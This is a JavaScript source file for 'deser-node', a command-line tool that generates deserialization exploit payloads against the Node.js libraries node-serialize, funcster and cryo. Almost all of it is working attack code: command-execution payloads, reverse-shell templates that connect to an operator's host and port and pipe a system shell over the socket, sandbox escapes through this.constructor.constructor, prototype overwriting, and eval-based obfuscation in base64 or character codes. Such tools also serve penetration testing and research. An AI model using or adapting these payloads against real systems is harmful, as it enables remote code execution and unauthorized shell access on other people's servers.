/**
# ==========================================================================================
# deser-node v0.4
# Date: 08-03-2020
# Author: d3adc0de
# ==========================================================================================
# This script provides a simple cli to generate payloads for:
# 
# - node-serialize
# - funcster
# - cryo
#
# PoC Version - Will be further developed soon
*/
var fs = require('fs');

var argv = require('yargs')
    .usage('Usage: node $0 -s [serializer] [options]')
    .alias('f', 'file')
    .alias('m', 'mode')
    .alias('s', 'serializer')
    .alias('v', 'vector')
    .alias('c', 'command')
    .alias('H', 'lhost')
    .alias('P', 'lport')
    .alias('t', 'target')
    .alias('e', 'encode')
    .alias('p', 'cryoprototype')
    .alias('h', 'help')
	.choices('e', ['charcode', 'b64'])
    .choices('s', ['ns', 'fstr', 'cryo'])
    .choices('m', ['serialize', 'deserialize'])
    .choices('v', ['rce', 'rshell'])
    .choices('t', ['linux', 'windows'])
    .default('t', 'windows')
	.default('p', 'toString')
    .default('m', 'serialize')
	.describe('f','Input file')
    .describe('m','Operational mode, may be serialize or deserialize')
    .describe('s','The serializer module to use')
    .describe('v','The vector is command exe or reverse shell')
    .describe('c','The command to execute (-v rce must be used)')
    .describe('e','Charencode the payload (not implemented yet)')
    .describe('H','Local listener IP (-v rshell must be used)')
    .describe('P','Local listener PORT (-v rshell must be used)')
    .describe('t','Target machine OS, may be Win or Linux')
    .demandOption(['s'])
	.showHelpOnFail(false, "Specify --help for available options")
    .argv;

var payload;

// Validate IP and PORT
function isValidIP(ipaddress) {
	return (/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ipaddress));
}

// Validate IP and PORT
function isValidPort(port) {
	return (/^\d{1,5}$/.test(port) && parseInt(port) > 0 && parseInt(port) <= 65535);
}

// Charcode Encode data
function charencode(data){
	var x = new Array();
	for(var i=0; i < data.length; i++){
		x.push(data.charCodeAt(i));
	}
	var encoded_data = "eval(String.fromCharCode(" + x.toString() + "))";
	console.log(encoded_data);
	return encoded_data;
}

// Charcode Encode data
function b64encode(data){
	var x = Buffer.from(data).toString('base64');
	var encoded_data = "eval(Buffer.from('" + x.toString() + "','base64').toString('utf-8'))";
	console.log(encoded_data);
	return encoded_data;
}

// Serialize function wrap
function serialize(serializer, object) {
    if (serializer == "fstr") {
        var serialize = require('funcster');
        return JSON.stringify(serialize.deepSerialize(object),null,0);
    } else if (serializer == "ns") {
        return require('node-serialize').serialize(object);
    } else if (argv.serializer == "cryo") {
        return require('cryo').stringify(object);
    }
}

// Deserialize function wrap
function deserialize(serializer, object) {
    if (serializer == "fstr") {
        return require('funcster').deepDeserialize(object);
    } else if (serializer == "ns") {
        return require('node-serialize').unserialize(object);
    } else if (argv.serializer == "cryo") {
        return require('cryo').parse(object);
    }
}

/* As dynamic commands couldn't be added during serialization,
*  these tags were applied to payload templates to allow dynamic
*  configuration 
*/
cmd_tag = /####COMMAND####/g;
lhost_tag = /####LHOST####/g;
lport_tag = /####LPORT####/g;
shell_tag = /####SHELL####/g;
sentinel_tag = /\/\/####SENTINEL####\s*}/g;
proto_tag=/function_prototype/g;

encoding_regex = /function\(\)\s*\{(.*);\s*\}\(\s+\)/g;
encoding_prefix = /function\(\)\s*\{/g;
encoding_suffix = /;\s*\}\(\s+\)/g;


//BEGIN - Payload Template Generation
if (argv.vector == "rshell" && argv.serializer != "cryo") {
    if (typeof argv.lport == 'undefined' || typeof argv.lhost == 'undefined') {
        console.log("[-] RShell vector requires LHOST and LPORT to be specified");
        process.exit();
    }else if(!isValidIP(argv.lhost) || !isValidPort(argv.lport)){
		console.log("[-] Invalid LHOST or LPORT");
        process.exit();
	}
    payload = {
        rce: function() {
            var net = require('net');
            var spawn = require('child_process').spawn;
            HOST = "####LHOST####";
            PORT = "####LPORT####";
            TIMEOUT = "5000";
            if (typeof String.prototype.contains === 'undefined') {
                String.prototype.contains = function(it) {
                    return this.indexOf(it) != -1;
                };
            }

            function c(HOST, PORT) {
                var client = new net.Socket();
                client.connect(PORT, HOST, function() {
                    var sh = spawn("####SHELL####", []);
                    client.write("Connected!");
                    client.pipe(sh.stdin);
                    sh.stdout.pipe(client);
                    sh.stderr.pipe(client);
                    sh.on('exit', function(code, signal) {
                        client.end("Disconnected!");
                    });
                });
                client.on('error', function(e) {
                    setTimeout(c(HOST, PORT), TIMEOUT);
                });
            }
            c(HOST, PORT);//####SENTINEL####
        }
    }
} else if (argv.vector == "rshell" && argv.serializer == "cryo") {
    if (typeof argv.lport == 'undefined' || typeof argv.lhost == 'undefined') {
        console.log("[-] RShell vector requires LHOST and LPORT to be specified");
        process.exit();
    }
    payload = {
        __proto: {
            function_prototype: function() {
                var net = require('net');
                var spawn = require('child_process').spawn;
                HOST = "####LHOST####";
                PORT = "####LPORT####";
                TIMEOUT = "5000";
                if (typeof String.prototype.contains === 'undefined') {
                    String.prototype.contains = function(it) {
                        return this.indexOf(it) != -1;
                    };
                }

                function c(HOST, PORT) {
                    var client = new net.Socket();
                    client.connect(PORT, HOST, function() {
                        var sh = spawn('####SHELL####', []);
                        client.write("Connected!");
                        client.pipe(sh.stdin);
                        sh.stdout.pipe(client);
                        sh.stderr.pipe(client);
                        sh.on('exit', function(code, signal) {
                            client.end("Disconnected!");
                        });
                    });
                    client.on('error', function(e) {
                        setTimeout(c(HOST, PORT), TIMEOUT);
                    });
                }
                c(HOST, PORT);//####SENTINEL####
            }
        }
    }
} else if (argv.vector == "rce" && argv.serializer != "cryo") {
    if (typeof argv.command == 'undefined') {
        console.log("[-] RCE vector requires a command to be specified");
        process.exit();
    }
    payload = {
        rce: function() {
            CMD = "####COMMAND####";
            require('child_process').exec(CMD, function(error, stdout, stderr) {
                console.log(stdout)
            });//####SENTINEL####
        },
    }
} else if (argv.vector == "rce" && argv.serializer == "cryo") {
    if (typeof argv.command == 'undefined') {
        console.log("[-] RCE vector requires a command to be specified");
        process.exit();
    }
    payload = {
        __proto: {
            function_prototype: function() {
                CMD = "####COMMAND####";
                require('child_process').exec(CMD, function(error, stdout, stderr) {
                    console.log(stdout)
                });//####SENTINEL####
            }
        }
    }
} else if(argv.serializer == "cryo"){
	payload = {
        __proto: {
            function_prototype: function() {
                require('child_process').exec('cmd /c calc', function(error, stdout, stderr) {
                    console.log(stdout)
                });//####SENTINEL####
            }
        }
    }
} else {
    payload = {
        rce: function() {
            require('child_process').exec('cmd /c calc', function(error, stdout, stderr) {
                console.log(stdout)
            });//####SENTINEL####
        },
    }
}
//END - Payload Template Generation

//BEGIN - Payload Customization
if (argv.mode == "serialize") {
    var serialized_object = serialize(argv.serializer, payload);
    if (argv.serializer == "cryo") {
		// Prototype rewriting
        serialized_object = serialized_object.replace("__proto", "__proto__");
    }
    // Beautify
	serialized_object = serialized_object.replace(/(\\t|\\n)/gmi, "");
	serialized_object = serialized_object.replace(/(\s+)/gmi," ");
	// Setting up CMD (if applicable)
    serialized_object = serialized_object.replace(cmd_tag, argv.command);
	// Setting up RSHELL (if applicable)
    serialized_object = serialized_object.replace(lhost_tag, argv.lhost);
    serialized_object = serialized_object.replace(lport_tag, argv.lport);
    // Setting up shell basing on OS
	if (argv.target == "windows") {
        serialized_object = serialized_object.replace(shell_tag, "cmd");
    } else if (argv.target == "linux") {
        serialized_object = serialized_object.replace(shell_tag, "/bin/sh");
    }
	// Making payload executable with "()"
	if(serialized_object.includes("####SENTINEL####")){
		serialized_object = serialized_object.replace(sentinel_tag, '}( )');
	} else {
		serialized_object = serialized_object.replace('"}}', '( )"}}');
	}
	if (argv.serializer == "fstr" || argv.serializer == "cryo") {
		if(argv.serializer == "cryo"){
			serialized_object = serialized_object.replace(proto_tag, argv.cryoprototype);
		}
        if (argv.vector == "rce" || typeof(argv.vector) == 'undefined') {
			// Modifying RCE payload to bypass the sandbox via this.constructor.constructor
            serialized_object = serialized_object.replace("require('child_process')", "const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process')");
        } else if (argv.vector == "rshell") {
			// Modifying RSHELL payload to bypass the sandbox via this.constructor.constructor
            serialized_object = serialized_object.replace("var net=require('net');var spawn=require('child_process').spawn;", "const process = this.constructor.constructor('return this.process')();var spawn=process.mainModule.require('child_process').spawn;var net=process.mainModule.require('net');");
            serialized_object = serialized_object.replace("var net = require('net');var spawn = require('child_process').spawn;", "const process = this.constructor.constructor('return this.process')();var spawn=process.mainModule.require('child_process').spawn;var net=process.mainModule.require('net');");
        }
    }
	
	if (argv.encode){
		var p = encoding_regex.exec(serialized_object)[0];
		p = p.replace(encoding_prefix, "");
		p = p.replace(encoding_suffix, "");
		if (argv.encode == "charcode"){
			p = "function(){" + charencode(p) + ";}()";
		} else if (argv.encode == "b64"){
			p = "function(){" + b64encode(p) + ";}()";			
		}
		serialized_object = serialized_object.replace(encoding_regex, p );
		
	}

	if(argv.file){
		fs.writeFile(argv.file, serialized_object, function(err) {
			if (err) throw err;
		});
	}
	// Debug check
    console.log(serialized_object);
	// Storing on file

} else if (argv.mode == "deserialize") {
	// Reading payload from file
    fs.readFile(argv.file, function(err, data) {
        if (err) throw err;
        console.log('[+] Deserializing payload');
        var object = data;
		// cryo handles JSON directly - no need to JSON.parse
		if (argv.serializer != "cryo") {
            object = JSON.parse(data);
        }
		// Triggering RCE
        var deser = deserialize(argv.serializer, object);
		// Triggering RCE for Cryo
		deser.toString();
    });
}